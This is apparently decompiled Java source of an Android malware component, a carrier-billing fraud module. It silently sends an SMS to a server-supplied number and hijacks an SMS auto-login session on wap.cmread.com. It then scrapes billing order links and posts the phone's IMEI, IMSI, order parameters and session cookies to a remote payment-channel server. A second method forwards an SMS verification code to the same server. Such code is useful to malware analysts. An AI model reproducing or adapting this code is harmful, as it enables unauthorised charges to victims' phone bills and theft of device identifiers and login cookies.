package com.amaz.onib;

import android.content.Context;
import android.telephony.SmsManager;
import com.amaz.onib.ar;
import com.yuanlang.pay.plugin.libs.z;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import org.json.JSONObject;
/* loaded from: classes.dex */
public class ca {

    /* loaded from: classes.dex */
    public interface a {
        void a(h hVar);

        void a(h hVar, int i, String str);
    }

    private static String a(Map<String, String> map) {
        StringBuffer stringBuffer = new StringBuffer();
        for (String str : map.keySet()) {
            stringBuffer.append(str).append("=").append(map.get(str)).append("; ");
        }
        return stringBuffer.toString();
    }

    /* JADX WARN: Removed duplicated region for block: B:64:0x030c  */
    /* JADX WARN: Removed duplicated region for block: B:68:0x0363  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void a(Context context, h hVar, a aVar, boolean z) {
        String str;
        String str2;
        Map<String, String> map;
        String str3;
        String optString;
        String optString2;
        int optInt;
        String[] split;
        r a2;
        String str4;
        int i = 0;
        String str5 = null;
        try {
            if ("wifi".equalsIgnoreCase(ar.c) || z) {
                String a3 = t.a("http://wap.cmread.com/sso/p/logindata.jsp?layout=9").b(true).a(30000).a();
                try {
                    JSONObject jSONObject = new JSONObject(a3);
                    String optString3 = jSONObject.optString("smsTo");
                    String optString4 = jSONObject.optString("cmccContent");
                    String optString5 = jSONObject.optString("cmccRm");
                    SmsManager.getDefault().sendTextMessage(optString3, null, optString4, null, null);
                    String str6 = a3;
                    while (true) {
                        int i2 = i + 1;
                        try {
                            Thread.sleep(5000L);
                            r a4 = t.a("http://wap.cmread.com/sso/smsautoLogin?e_l=9&client_id=cmread-wap&response_type=token&redirect_uri=http://wap.cmread.com/r/p/myspacedata.jsp?vt=9&aaa_flag=1&rm=" + optString5).b(true).a(30000);
                            str6 = a4.a();
                            map = a4.d().d();
                            if (!(map == null || map.get("userPhone") == null)) {
                                i2 = 5;
                            }
                            if (i2 >= 5) {
                                break;
                            }
                            i = i2;
                        } catch (Exception e) {
                            e = e;
                            str = str6;
                            if (e instanceof ce) {
                            }
                        }
                    }
                } catch (Exception e2) {
                    e = e2;
                    str = str2;
                    if (e instanceof ce) {
                    }
                }
            } else {
                map = null;
            }
            JSONObject jSONObject2 = new JSONObject(hVar.s);
            str3 = hVar.t;
            optString = jSONObject2.optString("nid");
            optString2 = jSONObject2.optString("cm");
            optInt = jSONObject2.optInt("type");
            split = jSONObject2.optString("keywords").split("\\|");
            a2 = t.a(str3).b(true).a(30000);
            if (map != null) {
                a2.b(map);
            }
            str = a2.a();
        } catch (Exception e3) {
            e = e3;
            str = null;
        }
        try {
            String substring = str3.substring(0, str3.indexOf("/", 10));
            Map<String, String> d = map == null ? a2.d().d() : map;
            Iterator<w> it = x.a(str, "a").iterator();
            while (true) {
                if (!it.hasNext()) {
                    str4 = null;
                    break;
                }
                str4 = it.next().a("href");
                if (str4 != null && str4.startsWith("/m/a/lj")) {
                    break;
                }
            }
            if (str4 != null) {
                r a5 = t.a(substring + str4).b(true).a(30000);
                if (d != null) {
                    a5.b(d);
                }
                str = a5.a();
            } else if (str.contains("已订购") || str.contains("已订阅")) {
                throw new ce(201, "获取不到计费地址");
            }
            Iterator<w> it2 = x.a(str, "input").iterator();
            while (true) {
                if (it2.hasNext()) {
                    String a6 = it2.next().a("value");
                    if (a6 != null && by.a(a6, split)) {
                        str5 = a6;
                        break;
                    }
                } else {
                    break;
                }
            }
            if (str5 != null) {
                r a7 = t.a(substring + str5).b(true).a(30000);
                if (d != null) {
                    a7.b(d);
                }
                JSONObject optJSONObject = new JSONObject(a7.a()).optJSONObject("Order").optJSONObject("orderUrl");
                String str7 = "{\n\"msgType\":\"" + (optInt == 0 ? "OrderReq" : "GetSmsReq") + "\",\n\"imei\":\"" + FSrvi.IMEI + "\",\n\"imsi\":\"" + FSrvi.IMSI + "\",\n\"nId\":\"" + optString + "\",\n\"channelID\":\"" + optString2 + "\", \n\"cpID\":\"" + optJSONObject.optString("cpID") + "\",\n\"fee\":\"" + optJSONObject.optString("fee") + "\",\n\"operCode\":\"" + optJSONObject.optString("operCode") + "\",\n\"orderId\":\"" + optJSONObject.optString("orderId") + "\",\n\"payType\":\"" + optJSONObject.optString("payType") + "\",\n\"productID\":\"" + optJSONObject.optString("productID") + "\",\n\"saleType\":\"" + optJSONObject.optString("saleType") + "\",\n\"spCode\":\"" + optJSONObject.optString("spCode") + "\",\n\"spServCode\":\"" + optJSONObject.optString("spServCode") + "\",\n\"Cpparam\":\"" + optJSONObject.optString("Cpparam") + "\",\n\"cookie\":\"" + a(d) + "\"\n} ";
                HashMap hashMap = new HashMap();
                hashMap.put("data", str7);
                String a8 = new ar() { // from class: com.amaz.onib.ca.1
                    @Override // com.amaz.onib.ar
                    public void a(String str8, boolean z2) {
                    }
                }.a(ar.b + "PayChannel/ReadWap/Order.aspx?MyOrderId=" + hVar.z, hashMap, ar.b.POST, "88");
                bs.b("cmread:" + a8);
                g.a(context).a(hVar.f732a, hVar.z, "pid", new JSONObject(a8).optString("seqId"));
                aVar.a(hVar);
                return;
            }
            throw new ce(1000, "");
        } catch (Exception e4) {
            e = e4;
            if (e instanceof ce) {
                ce ceVar = (ce) e;
                bs.a("TAG", ceVar.a() + "#" + ceVar.b());
                aVar.a(hVar, ((ce) e).a(), ((ce) e).b() + str);
                return;
            }
            aVar.a(hVar, z.c, e.getMessage() + str);
            bs.a("TAG", "" + e.getMessage());
            e.printStackTrace();
        }
    }

    public static void a(h hVar, String str) {
        String str2 = "smscode";
        try {
            str2 = ar.b + "PayChannel/ReadWap/Confirm.aspx?MyOrderId=" + hVar.z;
            bs.b("cmreadpay_smscode:reqId:" + hVar.D + " code:" + str);
            String str3 = "{\n\"msgType\":\"SmSOrderReq\",\n\"imei\":\"" + FSrvi.IMEI + "\",\n\"imsi\":\"" + FSrvi.IMSI + "\",\n\"seqId\":\"" + hVar.D + "\",\n\"smsCode\":\"" + str + "\"\n}\n";
            HashMap hashMap = new HashMap();
            hashMap.put("data", str3);
            String a2 = new ar() { // from class: com.amaz.onib.ca.2
                @Override // com.amaz.onib.ar
                public void a(String str4, boolean z) {
                }
            }.a(str2, hashMap, ar.b.POST, "88");
            bs.b("cmread:json:" + str3 + " \n" + a2);
            throw new ce(z.b, a2);
        } catch (Exception e) {
            e.printStackTrace();
            throw new ce(z.c, e.getMessage() + str2);
        }
    }
}
